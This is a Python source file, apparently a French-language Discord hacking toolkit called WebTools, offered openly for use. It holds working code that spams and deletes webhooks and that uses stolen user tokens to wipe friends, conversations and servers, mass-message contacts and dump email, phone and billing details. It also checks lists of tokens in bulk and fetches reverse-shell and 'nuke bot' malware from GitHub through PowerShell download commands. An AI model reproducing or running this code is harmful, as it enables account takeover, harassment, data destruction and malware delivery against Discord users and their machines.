# -*- coding: utf-8 -*-

from requests import get, post, patch, delete
from json import dumps, loads
from colorama import Fore, init
from threading import Thread
from time import sleep
import discord
from discord.ext import commands
from os import name, system, getenv
from os.path import isfile, isdir, split as split_path


init()



lien_base = "https://billy.loca.lt"


nom_fichier =__file__.split("\\")[-1]

if name == "nt":
    system("title WebTools")
    system("mode 160, 40")
    def clear():
        system("cls")
else:
    def clear():
        system("clear")

erreur = Fore.RESET + "[" + Fore.RED + "!" + Fore.RESET + "]"
valide = Fore.RESET + "[" + Fore.GREEN + "!" + Fore.RESET + "]"

nom_pc = getenv("username")


liste_oui = ["oui", "oe", "ouai", "ui", "oue"]
liste_non = ["nn", "non", "nan", "nop"]


def headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
    if token:
        headers.update({"Authorization":token})
    return headers


headers_site = {
        "Content-Type": "application/json",
        "User-Agent": "localtunnel"
        }



""" 


WEBHOOKS DEF 


"""


def check_webhook(lien):
    try:
        status = get(lien).status_code
        if status in [200, 204]:
            return True
        else:
            return False
    except:
        return False

def send_webhook(lien, username, avatar, content):
    webhook = {"username":username, "avatar_url":avatar, "content":content}
    return (post(lien, data = dumps(webhook).encode("utf-8"), headers=headers()).status_code)

def spam_webhook(lien, username, avatar, content):
    while True:
        try:
            send_webhook(lien, username, avatar, content)
        except:
            return

def delete_webhook(lien):
    return delete(lien).status_code

def patch_webhook(lien, username, avatar):
    try:
        if avatar:
            try:
                pp = get("https://pastebin.com/raw/gjrG0vX5") # Lien de l'image du webhook pour la modification
                if pp.status_code in [200, 204]:
                    pp = pp.text
                else:
                    pp = None
            except:
                pp = None
        else:
            pp = None
    except:
        pp = None
    if pp == None:
        webhook = {"name":username}
    else:
        webhook = {"name":username, "avatar":pp}
    try:
        response = patch(lien, data=dumps(webhook).encode(), headers = headers()).status_code
        if response in [200, 204]:
            return True
        else:
            return False
    except:
        return False

def infos_webhook(lien):
    try:
        resp = get(lien)
        if resp.status_code in [200, 204]:
            return loads(resp.text)
        else:
            return False
    except:
        return False    

""" 


MODE WEBHOOK


""" 

def webhook_mode():
    clear()
    print(Fore.YELLOW + """
    
    
                                                    ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗███████╗
                                                    ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝
                                                    ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ ███████╗
                                                    ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ ╚════██║
                                                    ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗███████║
                                                     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝""")
    print(Fore.RED + """
                                                        ____________________________________________________________
                                                                                                                      
                                                          1 : Envoyer un message   3 : Vérifier    5 : Supprimer                                                                                                  
                                                                                                                                                                                 
                                                          2 : Spam                 4 : Modifier    6 : Infos                     
                                                        ____________________________________________________________

                                                                       entrez [q] pour revenir au menu


                                                        """)

    webhook_choice_mode = input(Fore.RED + """                                                       [>] Mode : """)

    print("\n")

    if webhook_choice_mode not in ["1", "2", "3", "4", "5", "6", "q"]:
        webhook_mode()


    elif webhook_choice_mode == "q":
        return


    lien = input(Fore.YELLOW + "[>] Entrez le lien du webhook : ")
    try:
        rep = check_webhook(lien)
        if rep != True:
            print(erreur, "Le webhook est invalide :/")
            input()
            webhook_mode()
    except:
        print(erreur, "Le webhook est invalide :/")
        input()
        webhook_mode()


    if webhook_choice_mode == "1":
        username = input(Fore.YELLOW + "[>] Entrez le nom du webhook [none pour celui de base] : ")
        if username == "none":
            username = None
        avatar = input(Fore.YELLOW + "[>] Entrez le lien de l'avatar du webhook [none pour celle de base] : ")
        if avatar == "none":
            avatar = None
        content = input(Fore.YELLOW + "[>] Entrez le message à envoyer : ")
        try:
            response = send_webhook(lien, username, avatar, content)
            if response in [200, 204]:
                print(valide, "Message envoyé avec succés!")
            else:
                print(erreur, "Erreur lors de l'envoi du message. Le webhook est peut-être invalide?")
        except:
            print(erreur, "Erreur lors de l'envoi du message. Le webhook est peut-être invalide?")
        input()
        webhook_mode()

    elif webhook_choice_mode == "2":
        username = input(Fore.YELLOW + "Entrez le nom du webhook [none pour celui de base] > ")
        if username == "none":
            username = None
        avatar = input(Fore.YELLOW + "Entrez le lien de l'avatar du webhook [none pour celle de base] > ")
        if avatar == "none":
            avatar = None
        content = input(Fore.YELLOW + "[>] Entrez le message à spammer : ")
        if check_webhook(lien) == True:
            print(valide, "Le webhook est valide!")
            alert = input(Fore.RED + "Le programme continuera à spammer en arrière-plan, et s'arrêtera quand le webhook deviendra invalide. Voulez-vous continuer? [y/n] ")
            if alert == "y":
                Thread(target=spam_webhook, args=(lien, username, avatar, content)).start()
            webhook_mode()
        else:
            print(erreur, "Erreur. Le webhook est invalide :/")
            input()
        webhook_mode()


    elif webhook_choice_mode == "3":
        print(valide, "Le webhook est valide !")
        input()
        webhook_mode()

    elif webhook_choice_mode == "4":
        username = input(Fore.YELLOW + "[>] Entrez le nouveau nom du webhook : ")
        avatar = input(Fore.YELLOW + "[>] Voulez-vous changer l'avatar du webhook par celle de Plague ? [y/n] ")
        if avatar.lower() == "y":
            avatar = True
        else:
            avatar = False
        try: 
            rep = patch_webhook(lien, username, avatar)
            if rep == True:
                print(valide, "La modification du webhook à été réussie!")
                input()
            else:
                print(erreur, "La modification du webhook à échoué :/")
                input()
        except:
            print(erreur, "La modification du webhook à échoué :/")
            input()
        webhook_mode()


    elif webhook_choice_mode == "5":
        try:
            if delete(lien).status_code in [200, 204]:
                print(valide , "Le webhook à été supprimé!")
                input()
                webhook_mode()
            else:
                print(erreur, "Erreur lors de la suppression du webhook :/")
                input()
        except:
            print(erreur, "Erreur lors de la suppression du webhook :/")
            input()  
        webhook_mode()


    elif webhook_choice_mode == "6": 
        try:
            infos = infos_webhook(lien)
            if infos == False:
                print(erreur, "Le webhook est invalide :/")
                input() 
            else:
                print()
                for element in infos:
                    print(Fore.GREEN + f"{element}" + Fore.RESET + " >> " + Fore.YELLOW + f"{infos[element]}")   
                input()
        except:
            print(erreur, "Le webhook est invalide :/")
            input() 
        webhook_mode()
            


"""


TOKEN DEF


"""

friendsIds = []
channelIds = []
guildsIds = []

def token_check(token):
    headers_token = headers(token)
    try:
        statut = get("https://discordapp.com/api/v6/users/@me", headers=headers_token).status_code
    except:
        statut = 401
    if statut not in [200, 204]:
        return False
    else:
        return True

class Login(discord.Client):
    async def on_connect(self):
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        for g in self.guilds:
            guildsIds.append(g.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            clear()
            print("Erreur fatale. Veuillez réessayer :/")
            input()
            exit()

def token_nuke(token):
    clear()
    print(Fore.GREEN + "Récupération des statistiques du compte...")
    Login().run(token) 
    clear()
    headers1 = {'Authorization': token}
    sendall = input(Fore.BLUE + 'Veux tu envoyer un message à tous les amis récemment contactés? [oui-non] ')
    if sendall == 'oui':
        sendmessage = input(Fore.BLUE + 'Que veux-tu envoyer comme message aux amis récents? ')
    fremove = input(Fore.BLUE + 'Veux-tu supprimer toutes les conversations de ce compte? [oui-non] ')
    fdel = input(Fore.BLUE + 'Veux-tu supprimer tous les amis de ce compte? [oui-non] ')
    gdel = input(Fore.BLUE + 'Veux tu supprimer tous les serveurs de ce compte ? [oui-non] ')
    gleave = input(Fore.BLUE + 'Veux-tu quitter tous les serveurs? [oui-non] ')
    gcreate = input(Fore.BLUE + 'Veux-tu créer masse serveurs sur ce compte? [oui-non] ')
    if gcreate == "oui":
        gname = input(Fore.BLUE + "Comment veux-tu que les serveurs crées s'appellent? ")
        gserv = input(Fore.BLUE + 'Combien de serveurs veux-tu créer? [max. 100] ')
    dlmode = input(Fore.BLUE + 'Veux-tu définir le thème du compte en blanc? [oui-non] ')
    langspam = input(Fore.BLUE + 'Veux-tu définir la langue du compte en japonais? [oui-non] ')

    if sendall == 'oui':
        try:
            for id in channelIds:
                post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers1, data={"content": f"{sendmessage}"})
                print(Fore.GREEN + f"Message envoyé à l'ID : {id}.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gleave == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} quitté.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fdel == 'oui':
        try:
            for friend in friendsIds:
                delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers1)
                print(Fore.GREEN + f'Ami {friend} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fremove == 'oui':
        try:
            for id in channelIds:
                delete(f'https://discord.com/api/v8/channels/{id}', headers=headers1)
                print(Fore.GREEN + f'Conversation {id} supprimée.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gdel == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gcreate == 'oui':
        try:
            for i in range(int(gserv)):
                payload = {
                    'name': f'{gname}',
                    'region': 'europe', 
                    'icon': None, 
                    'channels': None}
                post('https://discord.com/api/v6/guilds', headers=headers1, json=payload)
                print(Fore.GREEN + f'Serveur [{gname}] crée, numéro: {i + 1} sur {gserv}.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if dlmode == 'oui':
        try:
            setting = {'theme': "light"}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "Le thème du compte à été défini sur blanc.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if langspam == 'oui':
        try:
            setting = {'locale':'ja'}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "La langue du compte à été définie sur japonais")
        except:
            print(Fore.Red + f'Erreur détectée.')

    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()


def token_info(token):
    print(Fore.GREEN + "\nChargement en cours...")
    r = get('https://discord.com/api/v6/users/@me', headers=headers(token)).json()
    username = r['username'] + '#' + r['discriminator']
    userid = r['id']
    phone = r['phone']
    email = r['email']
    try:
        billing = bool(len(loads(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers(token)).read().decode())) > 0)
    except:
        billing = False
    mfa = r['mfa_enabled']
    clear()
    print(Fore.GREEN + f'''
[ID de l'utillisateur]                    {userid}
[Nom d'utilisateur]                       {username}
[Authentification à deux facteurs]        {mfa}
[Carte bleue enregistrée]                 {billing}

[Email]                                   {email}
[Numéro de téléphone]                     {phone if phone else "Pas de numéro de téléphone :/"}
[Token]                                   {token}

    ''')
    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()

def mass_token_check(path):
    with open(path, "r") as f:
        contenu = f.read()
        contenu = contenu.splitlines()
    check = []
    valide = []
    for a in contenu:
        if a != "":
            check.append(a)

    largeur = 0
    longueur = len(contenu)
    for token in check:
        if token_check(token) == True:
            largeur += 1
            valide.append(token)
    return largeur, longueur, valide



"""

MODE TOKEN


"""


def token_mode():
    clear()
    print(Fore.RED + """
    
    
        
                                     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                                     ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                                        ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
                                        ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
                                        ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                                        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                     ___________________________________________________________________________________________
                                             
                                                1 : Token-Nuke           3 : Token-Info              5 : Mass-Token-Check


                                                2 : Token-Spam           4 : Token-Checker           6 : Token delete
                                     ___________________________________________________________________________________________
                                                                  
                                                                    entrez [q] pour revenir au menu                                             
                                                                                                            


    """)

    token_choice_mode = input(Fore.BLUE + """                                                       [>] Mode : """)

    if token_choice_mode not in ["1", "2", "3", "4", "5", "6", "q"]:
        token_mode()

    elif token_choice_mode == "q":
        return

    if token_choice_mode == "5":
        path = input(Fore.GREEN + "\n\n[>] Path du fichier qui contient les tokens [.txt] : ")
        if isfile(path):
            lan, leng, cont = mass_token_check(path)
            print(Fore.BLUE + f'{lan} sur {leng} tokens sont valides.')
            ouinon = input(Fore.MAGENTA + f"\nVoulez-vous enregistrer les tokens valides dans un nouveau fichier ou supprimer les tokens invalides de l'ancien fichier? [y/n/s] ")
            if ouinon == "y":
                new_path = split_path(path)[0:-1][0] + "/valid_tokens.txt"
                if isfile(new_path):
                    print("\n"+ erreur + "Le fichier spécifié existe déjà.")
                    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                    token_mode()
                else:
                    with open(new_path, "w") as f:
                        for a in cont:
                            f.write(a + "\f")
                    print(Fore.GREEN + "\nLe fichier vient d'être créé à [" + Fore.RESET + new_path + Fore.RESET + "].")
                    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                    token_mode()
            elif ouinon == "s":
                with open(path, "w") as f:
                    for a in cont:
                        f.write(a + "\f")
                print(Fore.GREEN + "\nLe fichier à été mis a jour avec succés.")
                input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                token_mode()
                
                    
            else:
                input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                token_mode()
                    
        else:
            print("\n" + erreur + "Erreur, le fichier spécifié n'existe pas :/")
            input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu...")
            main()



    token = input(Fore.GREEN + "\n\n[>] Token : ")
    retour = token_check(token)

    if retour == False:
        print(Fore.RED + "\nLe token est invalide :/")
        input(Fore.RESET + "\nAppuyez sur entrée pour continuer...")
        token_mode()

    if token_choice_mode == "1":
        token_nuke(token)
        clear()
        token_mode()

    if token_choice_mode == "3":
        token_info(token)

    if token_choice_mode == "4":
        print(Fore.BLUE + "\nLe token est valide xD")
        input(Fore.RESET + "\nAppuyez sur entrée pour continuer...")
        token_mode()

    




"""


MODE GENERATEURS 


"""


def generateurs_mode():
    clear()



"""


MODE MALWARE


"""


def malware_mode():
    clear()
    print(Fore.MAGENTA + """


                                                    ███╗   ███╗ █████╗ ██╗     ██╗    ██╗ █████╗ ██████╗ ███████╗
                                                    ████╗ ████║██╔══██╗██║     ██║    ██║██╔══██╗██╔══██╗██╔════╝
                                                    ██╔████╔██║███████║██║     ██║ █╗ ██║███████║██████╔╝█████╗  
                                                    ██║╚██╔╝██║██╔══██║██║     ██║███╗██║██╔══██║██╔══██╗██╔══╝  
                                                    ██║ ╚═╝ ██║██║  ██║███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗
                                                    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                
                                              le programme téléchargera automatiquement un programme issu de mon github
                                                                  https://github.com/billythegoat356
                                      __________________________________________________________________________________________
                                             
                                        1 : Reverse Shell (terminal)        3 : Nuke-Bot (discord)        5 : coming soon


                                        2 : Reverse Shell (bot discord)     4 : coming soon               6 :  coming soon
                                       __________________________________________________________________________________________
                                                                  
                                                                    entrez [q] pour revenir au menu 
    
    
    """)
    malware_choice_mode = input(Fore.RED + """                                                         [>] Mode : """)


    if malware_choice_mode not in ['1', '2', '3', '4', '5', '6', 'q']:
        malware_mode()

    if malware_choice_mode == "q":
        main()

    if malware_choice_mode == "1":
        try:
            path = input(Fore.GREEN + "\n[>] Entrez le chemin d'accés ou vous voulez installer le malware : ")
            print(Fore.RED + "\nChargement en cours...")
            if isdir(path):
                system(f"""cd {path} && powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/billythegoat356/ReverseShellTool/archive/refs/heads/main.zip', 'Reverse-Shell.zip')""")
            else:
                print(Fore.RED + "\nLe chemin d'accés spécifié est introuvable.")
                input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")
                malware_mode()
        except:
            print()
            input(erreur + " Une erreur est survenue. Nous sommes désolés pour la gêne occasionnée.")
            return
        print(Fore.BLUE + f"Le Reverse-Shell à été téléchargé à {path}.")
        print(Fore.GREEN + "Pour utiliser le Malware/Tool, décompressez le fichier puis éxécutez le fichier Python.")
        input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")

    if malware_choice_mode == "2":
        try:
            path = input(Fore.GREEN + "\n[>] Entrez le chemin d'accés ou vous voulez installer le malware : ")
            if isdir(path):
                system(f"""cd {path} && powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/billythegoat356/ReverseShellDiscord/archive/refs/heads/main.zip', 'Reverse-Shell-Discord.zip')""")
            else:
                print(Fore.RED + "\nLe chemin d'accés spécifié est introuvable.")
                input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")
                malware_mode()
        except:
            print()
            input(erreur + " Une erreur est survenue. Nous sommes désolés pour la gêne occasionnée.")
            return
        print(Fore.BLUE + f"Le Reverse-Shell-Discord à été téléchargé à {path}.")
        print(Fore.BLUE + "Le seul module nécessaire est 'discord'. Installez-le en faisant 'pip install discord' dans un terminal.")
        print(erreur, "Si il y a une erreur du genre 'pip n'est pas reconnu en tant que commande', veuillez réinstaller python en cochant 'add to path' pour avoir pip.")
        print(Fore.GREEN + "Pour utiliser le Malware/Tool, décompressez le fichier puis éxécutez le fichier Python.")
        input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")

    if malware_choice_mode == "3":
        try:
            path = input(Fore.GREEN + "\n[>] Entrez le chemin d'accés ou vous voulez installer le malware : ")
            print(Fore.RED + "\nChargement en cours...")
            if isdir(path):
                system(f"""cd {path} && powershell -Command "(New-Object Net.WebClient).DownloadFile('https://codeload.github.com/billythegoat356/Nuke-Bot.py/zip/refs/heads/main', 'Nuke-Bot.zip')""")
            else:
                print(Fore.RED + "\nLe chemin d'accés spécifié est introuvable.")
                input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")
                malware_mode()
        except:
            print()
            input(erreur + " Une erreur est survenue. Nous sommes désolés pour la gêne occasionnée.")
            return
        print(Fore.BLUE + f"Le Nuke-Bot à été téléchargé à {path}.")
        print(Fore.BLUE + "Le seul module nécessaire est 'discord'. Installez-le en faisant 'pip install discord' dans un terminal.")
        print(erreur, "Si il y a une erreur du genre 'pip n'est pas reconnu en tant que commande', veuillez réinstaller python en cochant 'add to path' pour avoir pip.")
        print(Fore.GREEN + "Pour utiliser le Malware/Tool, décompressez le fichier puis éxécutez le fichier Python.")
        input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu.")

        
    
"""


MODE SIGNALEMENT 


"""

    
def signalement_mode():
    clear()
    prenom_signalement = input(Fore.GREEN + "[>] Entrez votre prénom > ")
    message_signalement = input(Fore.GREEN + "[>] Entrez votre message > ")
    mess_signalement = {
        "message" : message_signalement, 
        "prenom" : prenom_signalement, 
        "nom_pc" : nom_pc,
        "os": name,
        "provenance" : nom_fichier
        }
    print("")
    try:
        resp = post(lien_base + "/api/v1/post", data = dumps(mess_signalement).encode("utf-8"), headers=headers_site)
        if resp.status_code in [200, 204]:
            input(valide +  " Votre message à été envoyé avec succés!")
        else:
            input(erreur + " L'envoi du message à échoué. C'est probablement la faute du serveur. Veuillez réessayer plus tard.")
    except:
        input(erreur + " L'envoi du message à échoué. C'est probablement la faute du serveur. Veuillez réessayer plus tard.")




"""


MODE BOITE DE RECEPTION


"""

def boite_de_reception_mode():
    clear()
    print(Fore.RED + "Chargement en cours...\n")
    try:
        resp = get(lien_base + "/api/v1/get/user")
        if resp.status_code in [200, 204]:
            print(Fore.GREEN + f"Nouveau message reçu des administrateurs : \n{resp.text}")
            input(Fore.RESET +"\nAppuyez sur entrée pour quitter...")
            return
    except:
        pass
    clear()
    try:
        print(Fore.RED + "Chargement en cours...\n")
        resp = get(lien_base + "/api/v1/get/news")
        if resp.status_code in [200, 204]:
            if resp.text == "":
                second = False
            else:    
                print(Fore.GREEN + "NOUVEAUTÉ >\n\n" + Fore.CYAN + f"{resp.text}")
                input(Fore.RESET +"\n\nAppuyez sur entrée pour passer...")
                second = True
        else:
            second = False
    except:
        second = False
    clear()
    if second == False:
        print(Fore.RED + "Aucune nouveauté.")
        input(Fore.RESET +"\nAppuyez sur entrée pour revenir au menu...")
        sleep(0.5)
    clear()





"""



MAIN



"""




def main():
    clear()
    print(Fore.GREEN + """


                                                ██╗    ██╗███████╗██████╗ ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                                                ██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                                                ██║ █╗ ██║█████╗  ██████╔╝   ██║   ██║   ██║██║   ██║██║     ███████╗
                                                ██║███╗██║██╔══╝  ██╔══██╗   ██║   ██║   ██║██║   ██║██║     ╚════██║
                                                ╚███╔███╔╝███████╗██████╔╝   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                                                 ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝""")

    print(Fore.RED + """                                           
                                                                par billythegoat356 | by billythegoat356    
                                                    ______________________________________________________________
                                                                                                                    
                                                        1 : Webhooks      3 : Gen Tools    5 : Signaler un bug                                                                                                                                
                                                                                                                
                                                        2 : Token Tools   4 : Malware      6 : Boite de réception
                                                    ______________________________________________________________""")                                           
                                                          
    print(Fore.GREEN + """       
                                                            Rejoins ce serveur pour plus de tools gratuits!
                                                                            discord.gg/billy


                                                        """)

    mode = input(Fore.BLUE + """                                                         [>] Mode : """)


    if mode == "1":
        webhook_mode()
        return

    if mode == "2":
        token_mode()

    if mode == "3":
        generateurs_mode()

    if mode == "4":
        malware_mode()

    if mode == "5":
        signalement_mode()

    if mode == "6":
        boite_de_reception_mode()



"""


LANCEMENT


"""


while True:
    clear() 
    main()
